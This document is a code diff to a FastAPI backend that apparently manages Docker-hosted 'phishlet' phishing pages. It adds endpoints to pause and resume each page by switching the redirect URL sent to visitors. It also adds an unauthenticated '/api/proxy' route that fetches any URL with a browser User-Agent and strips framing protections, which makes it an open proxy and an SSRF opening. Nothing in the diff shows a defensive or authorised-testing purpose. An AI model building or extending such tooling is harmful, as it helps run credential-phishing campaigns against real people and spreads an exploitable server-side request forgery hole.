@@ -6,6 +6,9 @@ import asyncio
 import subprocess
 from pathlib import Path
 from datetime import datetime, timedelta, timezone
+from urllib.request import Request, urlopen
+from urllib.error import URLError, HTTPError
+from urllib.parse import urlparse, quote
 
 from dotenv import load_dotenv
 load_dotenv()
@@ -68,6 +71,10 @@ class PhishletLaunchRequest(BaseModel):
 
 class SetRedirectUrlRequest(BaseModel):
     url: str
+
+
+class PauseRequest(BaseModel):
+    redirect_url: str
 
 
 class VisitEvent(BaseModel):
@@ -254,6 +261,10 @@ async def list_phishlets(email: str = Depends(get_current_user)):
             if len(parts) == 4:
                 running[parts[0]] = {"id": parts[1][:12], "status": parts[3], "image": parts[2]}
 
+    paused_keys = set()
+    async for doc in db.phishlet_settings.find({"pause_url": {"$exists": True, "$ne": ""}}, {"key": 1}):
+        paused_keys.add(doc.get("key"))
+
     phishlets = []
     for key, cfg in PHISHLETS.items():
         name = f"phishlet-{key}"
@@ -265,6 +276,7 @@ async def list_phishlets(email: str = Depends(get_current_user)):
             "url": cfg["url"],
             "port": cfg["port"],
             "running": running_container is not None,
+            "paused": key in paused_keys,
             "container_id": running_container["id"] if running_container else "",
             "status": running_container["status"] if running_container else "",
         })
@@ -386,6 +398,68 @@ async def restart_phishlet(key: str, email: str = Depends(get_current_user)):
     return await run_docker(["restart", container_name])
 
 
+@app.post("/api/phishlets/{key}/pause")
+async def pause_phishlet(key: str, body: PauseRequest, email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+
+    pause_url = (body.redirect_url or "").strip()
+    if not pause_url:
+        raise HTTPException(status_code=400, detail="Redirect URL is required to pause")
+    if not (pause_url.startswith("http://") or pause_url.startswith("https://")):
+        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")
+
+    original_url = PHISHLETS[key].get("redirect_url", "") or ""
+
+    await db.phishlet_settings.update_one(
+        {"key": key},
+        {"$set": {
+            "key": key,
+            "pause_url": pause_url,
+            "original_url": original_url,
+            "paused_at": datetime.now(timezone.utc),
+            "paused_by": email,
+        }},
+        upsert=True,
+    )
+
+    PHISHLETS[key]["redirect_url"] = pause_url
+
+    container_name = f"phishlet-{key}"
+    await run_docker(["restart", container_name])
+
+    logger.info("%s paused phishlet %s -> %s", email, key, pause_url)
+    return {"paused": True, "key": key, "redirect_url": pause_url}
+
+
+@app.post("/api/phishlets/{key}/unpause")
+async def unpause_phishlet(key: str, email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+
+    doc = await db.phishlet_settings.find_one({"key": key})
+    original_url = (doc.get("original_url", "") if doc else "") or ""
+
+    await db.phishlet_settings.update_one(
+        {"key": key},
+        {"$set": {
+            "key": key,
+            "redirect_url": original_url,
+            "url": original_url,
+        },
+        "$unset": {"pause_url": "", "original_url": "", "paused_at": "", "paused_by": ""}},
+        upsert=True,
+    )
+
+    PHISHLETS[key]["redirect_url"] = original_url
+
+    container_name = f"phishlet-{key}"
+    await run_docker(["restart", container_name])
+
+    logger.info("%s unpaused phishlet %s (restored: %s)", email, key, original_url)
+    return {"paused": False, "key": key, "redirect_url": original_url}
+
+
 @app.post("/api/phishlets/rebuild-image")
 async def rebuild_image(email: str = Depends(get_current_user)):
     dockerfile = str(BACKEND_DIR / "Dockerfile.firefox")
@@ -490,3 +564,35 @@ async def health():
 @app.get("/api/config")
 async def config():
     return {"allowRegister": ALLOW_REGISTER}
+
+
+@app.get("/api/proxy")
+async def proxy(url: str = Query(...)):
+    parsed = urlparse(url)
+    if parsed.scheme not in ("http", "https"):
+        raise HTTPException(status_code=400, detail="URL must start with http:// or https://")
+
+    try:
+        req = Request(url, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        })
+        resp = await asyncio.get_event_loop().run_in_executor(None, lambda: urlopen(req, timeout=10))
+        body = resp.read()
+        content_type = resp.headers.get("Content-Type", "text/html")
+    except HTTPError as exc:
+        raise HTTPException(status_code=exc.code, detail=f"Upstream returned {exc.code}")
+    except URLError:
+        raise HTTPException(status_code=502, detail="Failed to fetch upstream URL")
+    except Exception:
+        raise HTTPException(status_code=502, detail="Upstream request failed")
+
+    from fastapi.responses import Response
+    return Response(
+        content=body,
+        media_type=content_type,
+        headers={
+            "X-Frame-Options": "ALLOWALL",
+            "Content-Security-Policy": "frame-ancestors *",
+        },
+    )
